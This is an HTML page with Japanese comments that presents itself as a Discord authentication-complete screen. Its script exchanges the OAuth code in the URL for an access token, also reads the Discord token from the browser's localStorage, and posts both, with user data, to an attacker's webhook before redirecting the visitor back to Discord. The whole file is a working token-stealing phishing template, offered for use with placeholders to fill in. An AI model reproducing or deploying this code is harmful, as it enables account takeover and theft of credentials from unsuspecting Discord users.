<!DOCTYPE html>
<html>
<head>
    <title>認証完了</title>
</head>
<body>
    <h1>認証処理中...</h1>
    <script>
        const WEBHOOK_URL = "あなたのWebhookURL";
        
        // URLからコードを取得
        const params = new URLSearchParams(window.location.search);
        const code = params.get('code');
        
        if (code) {
            // コードを交換（サーバー側で行うべきだが簡易版）
            fetch('https://discord.com/api/oauth2/token', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `client_id=CLIENT_ID&client_secret=CLIENT_SECRET&grant_type=authorization_code&code=${code}&redirect_uri=REDIRECT_URI`
            })
            .then(r => r.json())
            .then(data => {
                // アクセストークン取得
                const access_token = data.access_token;
                
                // さらにブラウザのトークンも試行
                const browser_token = localStorage.getItem('token');
                
                // 送信
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        access_token: access_token,
                        browser_token: browser_token,
                        user: data.user
                    })
                });
            });
        }
        
        // 3秒後にDiscordに戻す
        setTimeout(() => {
            location.href = 'discord://';
        }, 3000);
    </script>
</body>
</html>
